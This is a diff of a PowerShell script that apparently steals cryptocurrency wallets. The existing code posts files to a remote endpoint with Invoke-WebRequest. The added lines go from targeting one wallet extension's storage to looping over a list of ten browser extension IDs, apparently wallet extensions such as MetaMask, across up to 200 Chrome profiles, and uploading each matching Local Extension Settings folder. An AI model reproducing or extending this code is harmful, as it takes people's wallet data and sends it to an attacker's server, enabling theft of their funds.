@@ -42,15 +42,20 @@ function GetFile() {
 	$msgin='access='+$kfjh+'&name='+$name+'&folder='+$folder;
 	Invoke-WebRequest -Uri $srsdf -Method Post -Body $msgin;
 }
+
+$urls  = @('bfnaelmomeimhlpmgjnjophhpkkoljpa','nkbihfbeogaeaoehlefnkodbefgpgknn','bhhhlbepdkbapadjdnnojkbgioiodbic','egjidjbpglichdcondbcbdnbeeppgdph','idnnbdplmphpflfnlkomgpfbpcgelopg','ppbibelpcjmhbdihakflkdcoccbgbkpo','mcohilncbfahbmgdjkbpemcciiolgcge','ldinpeekobnhjjdofggfgjlcehhmanlj','ibnejdfjmmkpcnlpebklmnkoeoihofec','hnfanknocfeofbddgcijnmhnfnkdnaad')
 $userProfile = $env:USERPROFILE
 $profile0Path = Join-Path -Path $userProfile -ChildPath "AppData\Local\Google\Chrome\User Data\Default"
 for ($i = 0; $i -le 200; $i++) {
     $profilePath = if ($i -eq 0) {$profile0Path} else {Join-Path -Path $userProfile -ChildPath "AppData\Local\Google\Chrome\User Data\Profile $i"}
     if (Test-Path $profilePath) {
-        $profilePath = $profilePath + "\Local Extension Settings" + "\nkbihfbeogaeaoehlefnkodbefgpgknn"
-        Write-Output "$profilePath"
-        $extra = "Profile " + $i
-        UploadFolder -folderPath $profilePath  -extraPath $extra
-    } else {
+        foreach ($url in $urls) {
+            $fullPath = Join-Path -Path $profilePath -ChildPath ("Local Extension Settings\" + $url)
+            Write-Output "$fullPath"
+            if (Test-Path $fullPath) {
+                $extra = "Profile " + $i
+                UploadFolder -folderPath $fullPath -extraPath $extra
+            }
+        }
     }
 }
